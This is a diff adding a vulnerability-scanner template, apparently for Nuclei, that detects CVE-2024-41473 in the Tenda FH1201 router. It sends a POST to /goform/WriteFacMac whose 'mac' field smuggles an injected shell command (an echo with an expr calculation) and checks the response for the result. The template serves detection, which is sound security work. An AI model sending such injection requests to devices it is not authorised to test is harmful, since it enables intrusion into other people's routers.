@@ -1,0 +1,33 @@
+id: poc-tenda-mac-rce
+info:
+  name: Tenda-FH1201 Command Injection Vulnerability (CVE-2024-41473)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve,cve-2024-41473
+variables:
+  t1: "{{rand_int(1000, 999000)}}"
+  t2: "{{rand_int(100, 1000)}}"
+  t3: "{{to_number(t1) - to_number(t2)}}"
+http:
+  - raw:
+      - |
+        POST /goform/WriteFacMac HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        mac=%3Becho+%22vulnerable%60expr+{{t1}}+-+{{t2}}%60%22
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "vulnerable"
+        part: body
+      - type: word
+        words:
+          - "{{t3}}"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
